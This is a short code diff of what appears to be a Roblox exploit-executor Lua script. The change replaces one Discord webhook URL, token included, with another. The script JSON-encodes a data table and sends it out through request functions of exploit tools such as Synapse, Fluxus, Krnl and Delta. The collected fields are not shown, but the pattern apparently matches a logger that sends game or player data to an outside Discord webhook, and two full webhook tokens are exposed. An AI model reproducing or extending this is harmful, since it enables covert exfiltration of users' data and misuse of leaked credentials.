@@ -82,7 +82,7 @@ local data = {
 }
 
 local jsonData = HttpService:JSONEncode(data)
-local webhookUrl = "https://discord.com/api/webhooks/1247783062515879947/yJ42T5wW0bTEWMh_Kkbkw-TSd7VrlQJVynZ_Wy4tvF1tQJdvHXMkiYBHHb9cDD9RYjII"
+local webhookUrl = "https://discord.com/api/webhooks/1247853090057486397/roi-thQqY2Xj9WKpj9-GX0RrfFE4M3dwIA5esUCODdHC9LKWes1lUSsAwT57kWwdQC8O"
 local headers = {["Content-Type"] = "application/json"}
 request = http_request or request or HttpPost or fluxus.request or syn.request or Krnl.request or delta.request;
 local request = http_request or request or HttpPost or syn.request
